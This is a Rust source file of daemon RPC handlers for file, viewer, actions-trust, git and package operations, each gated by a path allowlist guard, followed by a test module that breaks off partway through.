//! `/api/rpc` bodies for WP-19 slice 5a: the rest of the fs family that can
//! be served honestly (`fs_kind`, `fs_mime`, `fs_search`, `fs_rename`, and
//! since the 2026-10-06 gap audit `fs_exists`) and
//! the actions / keybindings file layer with its project-trust record
//! (`actions_read_files`, `actions_write`, `keybindings_write`,
//! `actions_trust_status`, `actions_trust_grant`, `actions_trust_revoke`) —
//! and, from slice 6, the per-project Atelier skill files
//! (`atelier_file_read` / `atelier_file_write`) and `action_git_branch`.
//!
//! Same house pattern as `rpc_local` / `rpc_shell`: the arm *names* stay in
//! `rpc.rs`'s dispatch `match` (the parity ratchet reads them there) and
//! delegate here; every body calls the core the desktop `#[tauri::command]`
//! calls (`server::shared::{fs, actions}`) and returns the same serialized
//! type, so the JSON shapes are the desktop's by construction. Arguments are
//! decoded by `rpc_shell::targ` (camelCase as `tauri-cmd.ts` sends them, or
//! snake_case; `null` = absent for an `Option`).
//!
//! **Paths.** Every caller path goes through the daemon's `PathGuard`, which
//! resolves it exactly as the desktop's `resolve_allowlisted` does and checks
//! the canonical result against the fs allowlist (`<data-dir>/fs_roots.json`)
//! — the boundary the served `fs_read` / `fs_write` use — and then refuses the
//! daemon's own state (`--data-dir`, the discovery file) even when the
//! allowlist covers it (`server::reserved`). The actions arms take
//! no path: they read and write `<home>/.ikenga/{actions,keybindings}.json`
//! (the daemon PROCESS's home — the same single-user seam as the personal
//! `settings.json`, G-PRINCIPAL topology B) and `<root>/.ikenga/…` for the
//! resolved project, whose root must be inside the allowlist (the manager's
//! `RootGuard`). The shared scope layer refuses a symlinked file or
//! `.ikenga/` directory on both surfaces.
//!
//! **Events.** The desktop manager emits `actions://changed` from its
//! watcher and on a trust grant / revoke. The daemon's manager publishes the
//! trust-change half on the event bus (`server::events`, `/ws/events`) and
//! starts no watcher; instead `actions_write` / `keybindings_write` publish
//! the same `{ path, file, scope }` event once a file was written, which is
//! what the desktop's watcher reports ~250 ms after the same write. A hand
//! edit on the server is not announced; the browser sees it on its next
//! read.
//!
//! **Trust.** A remote write cannot bypass the trust gate: `actions_write` /
//! `keybindings_write` never touch the trust record (see
//! `server::shared::actions`), which lives in `<data-dir>/actions-trust.json`,
//! user-side, never under the project. A written project file is untrusted /
//! held until `actions_trust_grant` pins the hash of the document in force,
//! and a grant with a stale hash is refused whole — the same gate the desktop
//! Trust dialog goes through. The daemon executes no action (`action_exec`
//! stays allowlisted), so trust here only decides what the browser shows.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use serde_json::Value;

use super::rpc::RpcResponse;
use super::rpc_local::{data_dir, respond, respond_named};
use super::rpc_shell::{targ, PathGuard};
use super::shared::actions::schema::FileKind;
use super::shared::actions::{
    ActionsManager, ActionsWriteResult, RootGuard, TrustGrantRequest, TrustRevokeRequest,
};
use super::shared::fs as shared_fs;
use super::shared::settings::SettingsScope;
use super::shared::{atelier, git};
use super::AppState;

const NO_DATA_DIR_ACTIONS: &str =
    "no actions store: the daemon was started without --data-dir, so there is no ikenga.db (projects) or actions-trust.json to open";
const NO_HOME_ACTIONS: &str =
    "no actions store: the daemon has no HOME in its environment, so there is no ~/.ikenga/actions.json to resolve";
const NO_DATA_DIR_TRASH: &str =
    "no data dir: the daemon was started without --data-dir, so there is no trash directory";

// ─── fs ──────────────────────────────────────────────────────────────────────

/// `state.path_guard` as the shared cores' resolver.
fn resolver(state: &AppState) -> impl Fn(&str) -> Result<PathBuf, String> + Sync + '_ {
    move |p: &str| state.path_guard.resolve(p)
}

/// The desktop answers `"missing"` for an allowlist-rejected path, and so
/// does this — but only once the allowlist exists: without `--data-dir`
/// every path would read as missing, which is an answer, not the truth.
/// `fs_read`: the desktop's `{ bytes, mime }`, which is what every viewer reads.
pub(super) async fn fs_read(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        shared_fs::read(&resolver(state), &path).await
    }
    .await;
    respond("fs_read", r)
}

/// `fs_write`. The desktop command is `fs_write(path, bytes)`, so `bytes` (an array of numbers)
/// is what `tauri-cmd.ts` sends. `content` (a string) is what the daemon's original arm took and
/// is kept. **Neither is an error.** The original arm read `content` with
/// `unwrap_or_default()`, so a call that sent only `bytes` wrote an empty file over the target.
pub(super) async fn fs_write(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        let bytes: Option<Vec<u8>> = targ(args, &["bytes"])?;
        let content: Option<String> = targ(args, &["content"])?;
        let data = match (bytes, content) {
            (Some(b), None) => b,
            (None, Some(c)) => c.into_bytes(),
            (Some(_), Some(_)) => {
                return Err("fs_write: pass `bytes` or `content`, not both".to_string())
            }
            (None, None) => return Err("fs_write: `bytes` is required".to_string()),
        };
        state.path_guard.ready()?;
        // The deep resolver, not `resolver(state)`: a write may target a file in a folder that
        // does not exist yet, so the allowlist check walks up to the nearest existing ancestor,
        // and it carries the `..` and dangling-link refusals `reserved.rs` pins.
        shared_fs::write(&|p: &str| state.path_guard.resolve_deep(p), &path, &data).await
    }
    .await;
    respond("fs_write", r)
}

/// `fs_trash`. Move target to the per-principal trash directory inside the data dir.
pub(super) async fn fs_trash(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        if path.is_empty() {
            return Err("path is required".to_string());
        }
        let dir = data_dir(state, NO_DATA_DIR_TRASH)?;
        let trash_dir = dir.join("trash");
        state.path_guard.ready()?;

        // Refuse `..` explicitly
        let raw_abs =
            crate::path_allow::expand_absolute(&path).map_err(|e| format!("expand path: {e}"))?;
        if raw_abs
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return Err("path may not contain `..`".to_string());
        }

        // Deep resolve with allowlist and reserved check
        let canonical = state.path_guard.resolve_deep(&path)?;

        // A subtree move: the path itself passing the allowlist is not enough.
        // Refuse an allowlist root or an ancestor of one (a root counts as
        // inside itself, and under T1 the root is the principal's home), and
        // an ancestor of the data dir — which would also make the move a
        // rename into its own subtree.
        state.path_guard.check_subtree_removable(&canonical)?;

        // Ensure cannot trash the trash dir, anything in it, or anything that
        // holds it (compared canonically: `--data-dir` may be given through a
        // symlink).
        let trash_canonical = trash_dir
            .canonicalize()
            .unwrap_or_else(|_| trash_dir.clone());
        for t in [&trash_dir, &trash_canonical] {
            if canonical.starts_with(t) || t.starts_with(&canonical) {
                return Err(format!(
                    "cannot trash the trash directory or a folder that holds it: {}",
                    canonical.display()
                ));
            }
        }

        // The daemon's home (under T1, the principal's): every PTY, `~/.claude`
        // and config lives there, so it and its ancestors are never trashed,
        // whatever the allowlist says.
        if let Some(home) = state.home.as_deref() {
            let home_canonical = home.canonicalize().unwrap_or_else(|_| home.to_path_buf());
            if home_canonical.starts_with(&canonical) || home.starts_with(&canonical) {
                return Err(format!(
                    "cannot trash the home directory or a folder that holds it: {}",
                    canonical.display()
                ));
            }
        }

        shared_fs::trash(&canonical, &trash_dir).await
    }
    .await;
    respond("fs_trash", r)
}

/// `fs_list`. The desktop command is `fs_list(dir, glob)`, so `dir` is the argument
/// `tauri-cmd.ts` sends; `path` is kept because the file picker and older callers use it. A
/// missing directory is an error: the original arm defaulted to `"."`, which on a daemon is
/// its own working directory and listed nothing the caller asked for.
pub(super) async fn fs_list(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let dir: String = targ(args, &["dir", "path"])?;
        let glob: Option<String> = targ(args, &["glob"])?;
        if glob.is_some() {
            return Err("fs_list: `glob` is not served by the headless daemon yet".to_string());
        }
        state.path_guard.ready()?;
        shared_fs::list(&resolver(state), &dir).await
    }
    .await;
    respond("fs_list", r)
}

pub(super) async fn fs_kind(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        Ok(shared_fs::kind(&resolver(state), &path).await)
    }
    .await;
    respond("fs_kind", r)
}

/// The desktop's `fs_exists`: `true` for an allowlisted regular file, and
/// `false` — not an error — for a refused path, exactly as the desktop
/// command folds `resolve_allowlisted` failures (gap audit 2026-10-06 rank
/// 17: the rejection surfaced as an unhandled promise rejection in the
/// markdown path linkifier). Refused is `false` whether or not the path
/// exists, so it answers nothing about the world outside the allowlist.
/// Only a daemon with no allowlist at all errors, naming the flag, as
/// `fs_kind` does.
pub(super) async fn fs_exists(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        Ok(shared_fs::exists(&resolver(state), &path).await)
    }
    .await;
    respond("fs_exists", r)
}

pub(super) fn fs_mime(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let path: String = targ(args, &["path"])?;
        state.path_guard.ready()?;
        shared_fs::mime(&resolver(state), &path)
    })();
    respond("fs_mime", r)
}

/// The root must be inside the allowlist (and not the daemon's own state);
/// the walk never follows a symlinked directory out of it (see
/// `shared::fs::search`) and never matches or descends into the data dir or
/// the discovery file, even when the root is an ancestor of them. Same caps
/// as the desktop: `limit` (default 500, minimum 1), early stop with
/// `truncated`.
pub(super) async fn fs_search(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let root: String = targ(args, &["root"])?;
        let query: String = targ(args, &["query"])?;
        let show_hidden: bool = targ(args, &["showHidden", "show_hidden"])?;
        let show_ignored: bool = targ(args, &["showIgnored", "show_ignored"])?;
        let limit: Option<usize> = targ(args, &["limit"])?;
        state.path_guard.ready()?;
        // Resolved once per walk; every entry is then canonical (the root is,
        // and the walk follows no symlink), so the per-entry check is a prefix
        // compare plus, for a directory, its inode.
        let reserved = state.path_guard.reserved_snapshot();
        shared_fs::search_skipping(
            &resolver(state),
            &root,
            &query,
            show_hidden,
            show_ignored,
            limit,
            move |entry| {
                let dir_meta = entry
                    .file_type()
                    .is_ok_and(|t| t.is_dir())
                    .then(|| entry.metadata().ok())
                    .flatten();
                reserved.skips_entry(&entry.path(), dir_meta.as_ref())
            },
        )
        .await
    }
    .await;
    respond("fs_search", r)
}

/// Every end is resolved through the allowlist; `toName` is a bare basename
/// and the optional `toDir` makes it a move into that folder.
pub(super) async fn fs_rename(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let from: String = targ(args, &["from"])?;
        let to_name: String = targ(args, &["toName", "to_name"])?;
        let to_dir: Option<String> = targ(args, &["toDir", "to_dir"])?;
        state.path_guard.ready()?;
        shared_fs::rename(&resolver(state), &from, &to_name, to_dir.as_deref()).await
    }
    .await;
    respond("fs_rename", r)
}

/// Register an allowlisted directory as an authenticated viewer mount root (gap audit rank 8).
///
/// `filePath` is the page being previewed. The root the client asks for is
/// derived from that page's own markup (`../` ascents), so it is attacker
/// influenced: a hostile page in a shared project could otherwise widen its
/// mount to the whole home and `fetch()` credentials out of it. The daemon
/// therefore decides how high the root may go from its own project registry
/// (`viewer_guard::resolve_mount`): no higher than the file's project root, or
/// for a file in no project its own directory. Above that is an error, not a
/// clamp. A bound that is the home directory or above makes the mount
/// single-file: only the previewed page is served.
pub(super) async fn viewer_serve(
    state: &AppState,
    args: &Value,
    principal_id: Option<uuid::Uuid>,
) -> RpcResponse {
    let r = async {
        let root_dir: String = targ(args, &["rootDir", "root_dir"])?;
        let file_path: String = targ(args, &["filePath", "file_path"]).map_err(|_| {
            "viewer_serve needs filePath (the page being previewed); reload the app".to_string()
        })?;
        state.path_guard.ready()?;
        let canonical = state.path_guard.resolve_deep(&root_dir)?;
        if !canonical.is_dir() {
            return Err(format!("not a directory: {}", canonical.display()));
        }
        let file = state.path_guard.resolve_deep(&file_path)?;
        if !file.is_file() {
            return Err(format!("not a file: {}", file.display()));
        }
        let projects = super::viewer::project_roots(state).await;
        let home = state.home.as_ref().and_then(|h| h.canonicalize().ok());
        let scope = match crate::viewer_guard::resolve_mount(
            &canonical,
            &file,
            &projects,
            home.as_deref(),
        ) {
            Ok(scope) => scope,
            Err(e) => {
                tracing::warn!(
                    "viewer_serve: refused root {} for {}: {e}",
                    canonical.display(),
                    file.display()
                );
                return Err(e);
            }
        };
        let (url, token) = state.viewer.register(canonical, scope, principal_id);
        Ok(serde_json::json!({
            "url": url,
            "token": token,
        }))
    }
    .await;
    respond("viewer_serve", r)
}

/// Unregister a viewer mount (gap audit rank 8).
pub(super) async fn viewer_stop(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let token: String = targ(args, &["token"])?;
        state.viewer.unregister(&token);
        Ok(serde_json::json!(()))
    }
    .await;
    respond("viewer_stop", r)
}

// ─── actions / keybindings ───────────────────────────────────────────────────

/// The daemon's `ActionsManager`: the desktop's, with no notifier (no
/// watcher, no emits), the trust record in `<data-dir>`, the personal files
/// under `home`, and every project root checked against `guard`.
pub(crate) fn daemon_actions(
    db: Arc<crate::db::PaDb>,
    data_dir: &Path,
    home: PathBuf,
    guard: PathGuard,
    notifier: Option<super::shared::actions::watch::ActionsNotifier>,
) -> ActionsManager {
    let root_guard: RootGuard = Arc::new(move |root: &Path| {
        guard.check_maybe_missing(root).map_err(|e| {
            format!(
                "the project root is outside the daemon's fs allowlist: {} ({e})",
                root.display()
            )
        })
    });
    ActionsManager::with_notifier(notifier, db, data_dir, home)
        .without_file_watcher()
        .with_root_guard(root_guard)
}

pub(super) fn actions(state: &AppState) -> Result<&ActionsManager, String> {
    match &state.actions {
        Some(m) => Ok(m),
        None if state.config.data_dir.is_none() || state.pa_db.is_none() => {
            Err(NO_DATA_DIR_ACTIONS.to_string())
        }
        None => Err(NO_HOME_ACTIONS.to_string()),
    }
}

pub(super) async fn actions_read_files(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?.read_files(project_id.as_deref()).await
    }
    .await;
    respond("actions_read_files", r)
}

async fn write(
    state: &AppState,
    kind: FileKind,
    args: &Value,
) -> Result<ActionsWriteResult, String> {
    let scope: String = targ(args, &["scope"])?;
    // Tauri's `document: Value` takes JSON null as a value (which validation
    // then refuses), so read it raw rather than through `targ`.
    let document = args
        .get("document")
        .cloned()
        .ok_or_else(|| "`document` is required".to_string())?;
    let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
    let manager = actions(state)?;
    let scope = SettingsScope::parse(&scope)?;
    let result = manager
        .write(kind, scope, project_id.as_deref(), document)
        .await?;
    // What the desktop's watcher reports for the same write (the daemon
    // runs none); a refused document wrote nothing, so nothing changed.
    if result.written {
        state.events.publish(
            super::events::Topic::ActionsChanged,
            super::shared::actions::watch::ActionsChangeEvent {
                path: result.path.clone(),
                file: result.kind,
                scope: result.scope,
                reason: None,
            },
        );
    }
    Ok(result)
}

pub(super) async fn actions_write(state: &AppState, args: &Value) -> RpcResponse {
    respond("actions_write", write(state, FileKind::Actions, args).await)
}

/// A project `scope: "os"` rule is refused with `E_OS_LAYER` (DEC-60), by the
/// same validation the desktop runs.
pub(super) async fn keybindings_write(state: &AppState, args: &Value) -> RpcResponse {
    respond(
        "keybindings_write",
        write(state, FileKind::Keybindings, args).await,
    )
}

pub(super) async fn actions_trust_status(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?.trust_status(project_id.as_deref()).await
    }
    .await;
    respond("actions_trust_status", r)
}

/// `request` is the desktop's `TrustGrantRequest` (camelCase fields — Tauri
/// renames only top-level parameter names). Refused whole if any hash is not
/// the one in force now.
pub(super) async fn actions_trust_grant(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let request: TrustGrantRequest = targ(args, &["request"])?;
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?
            .trust_grant(project_id.as_deref(), request)
            .await
    }
    .await;
    respond("actions_trust_grant", r)
}

/// An absent / empty `request` revokes everything the project has.
pub(super) async fn actions_trust_revoke(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let request: Option<TrustRevokeRequest> = targ(args, &["request"])?;
        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
        actions(state)?
            .trust_revoke(project_id.as_deref(), request.unwrap_or_default())
            .await
    }
    .await;
    respond("actions_trust_revoke", r)
}

// ─── atelier files + `{{branch}}` (WP-19 slice 6) ────────────────────────────
//
// Bodies in `server::shared::{atelier, git}`, the cores the desktop commands
// call. The caller's root (`projectRoot`, `root`) goes through the daemon's
// `PathGuard` — the fs allowlist plus the daemon's own state — before anything
// under it is touched, and the atelier helpers then stay inside the CANONICAL
// root (`atelier::Reach::Confined`: a symlink at `.atelier`, `.atelier/<skill>`
// or the file is refused, the temp file is created exclusively). `skill` /
// `file` keep the desktop's `is_safe_segment`. Nothing spawns; nothing is
// emitted. Without `--data-dir` there is no allowlist: `NO_DB`.

/// The allowlist exists (it is loaded from `--data-dir`).
fn fs_boundary(state: &AppState) -> Result<(), String> {
    data_dir(state, super::rpc::NO_DB)?;
    state.path_guard.ready()
}

/// A root outside the allowlist is an error, never the desktop's `null`
/// (which would read as "no such file"); an unsafe segment, an absent root or
/// file is `null`, as on the desktop.
pub(super) fn atelier_file_read(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let project_root: Option<String> = targ(args, &["projectRoot", "project_root"])?;
        let skill: String = targ(args, &["skill"])?;
        let file: String = targ(args, &["file"])?;
        fs_boundary(state)?;
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        atelier::read(
            project_root.as_deref(),
            &skill,
            &file,
            atelier::Reach::Confined(&check),
        )
    })();
    respond_named("atelier_file_read", r)
}

/// The desktop's atomic write and its error strings, confined to the root.
/// The root must already exist (the desktop would create it).
pub(super) fn atelier_file_write(state: &AppState, args: &Value) -> RpcResponse {
    let r = (|| {
        let project_root: Option<String> = targ(args, &["projectRoot", "project_root"])?;
        let skill: String = targ(args, &["skill"])?;
        let file: String = targ(args, &["file"])?;
        let content: String = targ(args, &["content"])?;
        fs_boundary(state)?;
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        atelier::write(
            project_root.as_deref(),
            &skill,
            &file,
            &content,
            atelier::Reach::Confined(&check),
        )
    })();
    respond_named("atelier_file_write", r)
}

/// `{{branch}}` at `root`. A relative root is the desktop's `null`; a root the
/// guard refuses is an error. `.git` and the `HEAD` it resolves to (a
/// worktree's `gitdir:` target included) are read only when their canonical
/// path is admitted too — otherwise `null`, no branch.
pub(super) async fn action_git_branch(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let root: String = targ(args, &["root"])?;
        fs_boundary(state)?;
        let root = PathBuf::from(root);
        if !root.is_absolute() {
            return Ok(None);
        }
        state.path_guard.check_maybe_missing(&root)?;
        let guard = state.path_guard.clone();
        let may_read = move |p: &Path| p.canonicalize().is_ok_and(|c| guard.check(&c).is_ok());
        Ok(
            tokio::task::spawn_blocking(move || git::git_branch_at_with(&root, &may_read))
                .await
                .unwrap_or(None),
        )
    }
    .await;
    respond("action_git_branch", r)
}

/// Read-only, project-confined `git_status` (WP-G): branch name, ahead/behind,
/// and per-file status for the title-row branch chip and explorer badges.
///
/// Refuses paths outside the fs allowlist / project root with an error.
/// If `root` is not a git repository, returns `null` (None).
pub(super) async fn git_status(state: &AppState, args: &Value) -> RpcResponse {
    let r = async {
        let root_arg: Option<String> = targ(args, &["root", "repo", "path"]).ok();
        let project_id_arg: Option<String> = targ(args, &["projectId", "project_id"]).ok();

        let root_str = match (root_arg, project_id_arg) {
            (Some(r), _) => r,
            (None, Some(pid)) => {
                let pool = state
                    .pa_db
                    .as_ref()
                    .ok_or(super::rpc::NO_DB)?
                    .ensure_pool()
                    .await?;
                let resolved: Option<String> =
                    sqlx::query_scalar("SELECT root_path FROM projects WHERE id = ?")
                        .bind(&pid)
                        .fetch_optional(&pool)
                        .await
                        .map_err(|e| format!("db query project: {e}"))?;
                resolved.ok_or_else(|| format!("project `{pid}` not found"))?
            }
            (None, None) => return Err("`root` is required".to_string()),
        };

        fs_boundary(state)?;
        let root = PathBuf::from(&root_str);
        if !root.is_absolute() {
            return Err("`root` must be an absolute path".to_string());
        }
        if root
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return Err("`root` may not contain `..`".to_string());
        }

        let canonical_root = state.path_guard.resolve_deep(&root_str)?;
        if !canonical_root.is_dir() {
            return Err(format!("`{}` is not a directory", canonical_root.display()));
        }

        let guard = state.path_guard.clone();
        let paths = match git::prepare_git_paths(canonical_root.clone(), move |p: &Path| {
            guard.check(p).is_ok()
        })
        .await?
        {
            Some(p) => p,
            None => return Ok(None),
        };
        git::run_hardened_git_status(&canonical_root, paths).await
    }
    .await;
    respond("git_status", r)
}

// ─── pkg manifests + scaffold (WP-19 slice 8) ────────────────────────────────
//
// None of these needs the live pkg kernel: a preview parses one manifest, the
// workspace scan reads a directory (its `installed` flag comes from the
// daemon's own `--pkgs-dir` index — the set `pkg_kernel_status` reports), and
// the scaffold writes embedded templates. Every caller path goes through the
// guard; the scaffold writes through `confined_fs`.

/// `pkg_preview_manifest`: `installPath` must resolve (canonically) inside the
/// fs allowlist and outside the daemon's state, and so must the
/// `manifest.json` it reads — a link there to anywhere the guard refuses is
/// refused, not followed. Registers nothing. Errors otherwise are the
/// desktop's (`read …/manifest.json: …`, `parse manifest at …`).
///
/// A pkg under `--pkgs-dir` previews only when that dir is inside the fs
/// allowlist: the index names it, but the guard is the boundary for a path a
/// caller hands back.
pub(super) fn pkg_preview_manifest(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_workspace;
    use std::path::Path;
    let r = (|| {
        let install_path: String = targ(args, &["installPath", "install_path"])?;
        if install_path.is_empty() {
            return Err("`installPath` is required".to_string());
        }
        let target_path = Path::new(&install_path);
        if let Some(installed) = state
            .pkg_index
            .installed()
            .iter()
            .find(|s| Path::new(&s.install_path) == target_path)
        {
            return pkg_workspace::preview_manifest(Path::new(&installed.install_path));
        }
        fs_boundary(state)?;
        let dir = state.path_guard.resolve(&install_path)?;
        if let Ok(manifest) = dir.join("manifest.json").canonicalize() {
            state.path_guard.check(&manifest)?;
        }
        // A missing (or dangling) manifest.json reads nothing: `Package::load`
        // reports the desktop's own "read …" error for it.
        pkg_workspace::preview_manifest(&dir)
    })();
    respond("pkg_preview_manifest", r)
}

/// `pkg_discover_workspace`: `workspaceDir`, else the daemon process's
/// `IKENGA_WORKSPACE_DIR` (the desktop's own fallback, for the daemon's own
/// env); neither = `[]`, as on the desktop. The dir is resolved through the
/// guard (a refusal is an error, never an empty list); a missing dir inside
/// the allowlist is `[]`. A child dir or `manifest.json` that canonicalizes
/// somewhere the guard refuses reads as absent.
pub(super) fn pkg_discover_workspace(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_workspace::{self, Reach};
    let r = (|| {
        let workspace_dir: Option<String> = targ(args, &["workspaceDir", "workspace_dir"])?;
        let Some(dir) = workspace_dir.or_else(|| std::env::var("IKENGA_WORKSPACE_DIR").ok()) else {
            return Ok(Vec::new());
        };
        if dir.is_empty() {
            // The desktop's `PathBuf::from("")` is no directory: nothing read.
            return Ok(Vec::new());
        }
        fs_boundary(state)?;
        let dir = state.path_guard.resolve_deep(&dir)?;
        let installed: std::collections::HashSet<String> = state
            .pkg_index
            .installed()
            .iter()
            .map(|s| s.id.clone())
            .collect();
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check(p);
        Ok(pkg_workspace::discover(
            &dir,
            &installed,
            Reach::Confined(&check),
        ))
    })();
    respond("pkg_discover_workspace", r)
}

/// `pkg_scaffold`: the desktop's destination rules against the router home
/// (G-PRINCIPAL single-user seam) and the daemon's `ikenga.db` projects. The
/// destination must be absolute — the desktop's `project` fallback for the
/// workspace scope is the process cwd (`.`), which the daemon refuses rather
/// than scaffold into its own working directory — and must pass the guard
/// (fs allowlist + the daemon's state) as resolved from its canonical nearest
/// existing ancestor; the write then runs from that form with
/// `confined_fs::Reach::Confined`. `targetPath` / `targetFolder` in the answer
/// are that canonical form. `params` is decoded as the desktop's
/// `PkgScaffoldParams` (camelCase fields — Tauri renames only top-level
/// argument names).
pub(super) async fn pkg_scaffold(state: &AppState, args: &Value) -> RpcResponse {
    use super::shared::pkg_scaffold::{self as scaffold, PkgScaffoldParams, Reach};
    let r = async {
        let params: PkgScaffoldParams = targ(args, &["params"])?;
        fs_boundary(state)?;
        let db = super::rpc_local::pa_db(state)?;
        let (folder, primary) =
            scaffold::resolve_destination_in(db, &params, state.home.as_deref()).await?;
        if !folder.is_absolute() {
            return Err(format!(
                "scaffold destination is not absolute: {} (the daemon will not scaffold into its working directory)",
                folder.display()
            ));
        }
        let canonical = state.path_guard.resolve_maybe_missing(&folder)?;
        let primary = canonical.join(
            primary
                .strip_prefix(&folder)
                .map_err(|_| format!("failed to resolve {}", primary.display()))?,
        );
        let guard = &state.path_guard;
        let check = |p: &Path| guard.check_maybe_missing(p);
        let files =
            scaffold::execute_scaffold_in(&params, &canonical, &primary, Reach::Confined(&check))?;
        Ok(scaffold::result(params, &canonical, &primary, files))
    }
    .await;
    respond("pkg_scaffold", r)
}

/// Router tests for every slice-8 arm (these three, and `rpc_shell`'s
/// `pin_screenshot_write` / `scaffold_agent_config`), a file of their own.
#[cfg(test)]
#[path = "rpc_slice8_tests.rs"]
mod slice8_tests;

#[cfg(test)]
mod tests {
    //! House pattern (see `rpc_shell`'s tests): a literal `ServerConfig` →
    //! the router → `oneshot` POST `/api/rpc` with the bearer token. The home
    //! and the fs allowlist are pinned to temp dirs, so nothing here touches
    //! the real `~/.ikenga` or installs the process-global `fs_roots`.

    use std::path::{Path, PathBuf};
    use std::sync::Arc;

    use axum::body::Body;
    use axum::http::StatusCode;
    use axum::Router;
    use serde_json::{json, Value};
    use tower::ServiceExt;

    use super::PathGuard;
    use crate::db::PaDb;
    use crate::engines::EngineRegistry;
    use crate::executor::ExecutorTier;
    use crate::pty::PtyManager;
    use crate::server::shared::actions::trust::{run_hash, TRUST_FILE_NAME};
    use crate::server::shared::actions::ActionsManager;
    use crate::server::shared::fs as shared_fs;
    use crate::server::shared::projects::{self, CreateArgs};
    use crate::server::{router_with, ServerConfig};

    fn config(data_dir: Option<PathBuf>) -> ServerConfig {
        ServerConfig {
            host: "127.0.0.1".into(),
            port: 0,
            static_dir: PathBuf::from("no-spa-here"),
            pkgs_dir: None,
            data_dir,
            auth_token: Some("tok".into()),
            allowed_origins: vec![],
            idle_timeout_secs: None,
            executor_tier: ExecutorTier::T0,
        }
    }

    /// A daemon with `--data-dir`, a home, and an fs allowlist of exactly
    /// `allowed/`. `outside/` is a sibling the allowlist does not cover.
    struct Daemon {
        _tmp: tempfile::TempDir,
        data: PathBuf,
        home: PathBuf,
        allowed: PathBuf,
        outside: PathBuf,
        db: Arc<PaDb>,
        guard: PathGuard,
        router: Router,
    }

    fn daemon_with_home(with_home: bool) -> Daemon {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        let (data, home) = (root.join("data"), root.join("home"));
        let (allowed, outside) = (root.join("allowed"), root.join("outside"));
        for d in [&data, &home, &allowed, &outside] {
            std::fs::create_dir_all(d).unwrap();
        }
        let roots_file = root.join("fs_roots.json");
        std::fs::write(
            &roots_file,
            json!({ "roots": [allowed.to_string_lossy()] }).to_string(),
        )
        .unwrap();
        let roots = crate::fs_roots::FsRoots::load(roots_file).unwrap();
        let guard = PathGuard::roots(Arc::new(roots));
        let db = Arc::new(PaDb::new(data.join("ikenga.db")));
        let router = router_with(
            config(Some(data.clone())),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            Some(db.clone()),
            None,
            with_home.then(|| home.clone()),
            guard.clone(),
        );
        Daemon {
            _tmp: tmp,
            data,
            home,
            allowed,
            outside,
            db,
            guard,
            router,
        }
    }

    fn daemon() -> Daemon {
        daemon_with_home(true)
    }

    /// No `--data-dir` (so no `PaDb`, no allowlist, no actions store).
    fn bare() -> Router {
        router_with(
            config(None),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            None,
            None,
            None,
            PathGuard::allowlist(),
        )
    }

    async fn rpc(router: &Router, cmd: &str, args: Value) -> Value {
        let res = router
            .clone()
            .oneshot(
                axum::http::Request::builder()
                    .method("POST")
                    .uri("/api/rpc")
                    .header("authorization", "Bearer tok")
                    .header("content-type", "application/json")
                    .body(Body::from(json!({ "cmd": cmd, "args": args }).to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
            .await
            .unwrap();
        serde_json::from_slice(&bytes).unwrap()
    }

    async fn ok(router: &Router, cmd: &str, args: Value) -> Value {
        let res = rpc(router, cmd, args.clone()).await;
        assert_eq!(res["ok"], true, "{cmd} {args} → {res}");
        res.get("data").cloned().unwrap_or(Value::Null)
    }

    async fn err(router: &Router, cmd: &str, args: Value) -> String {
        let res = rpc(router, cmd, args.clone()).await;
        assert_eq!(res["ok"], false, "{cmd} {args} should fail → {res}");
        res["error"].as_str().unwrap().to_string()
    }

    fn s(p: &Path) -> String {
        p.to_string_lossy().into_owned()
    }

    #[cfg(unix)]
    fn symlink(target: &Path, link: &Path) {
        std::os::unix::fs::symlink(target, link).unwrap();
    }

    // ── no data dir / no home ───────────────────────────────────────────────

    #[tokio::test]
    async fn every_arm_without_data_dir_names_the_flag() {
        let r = bare();
        for (cmd, args) in [
            ("fs_kind", json!({ "path": "/tmp" })),
            ("fs_exists", json!({ "path": "/tmp/a.md" })),
            ("fs_mime", json!({ "path": "/tmp/a.md" })),
            (
                "fs_search",
                json!({ "root": "/tmp", "query": "a", "showHidden": false, "showIgnored": false }),
            ),
            ("fs_rename", json!({ "from": "/tmp/a", "toName": "b" })),
            ("actions_read_files", json!({})),
            (
                "actions_write",
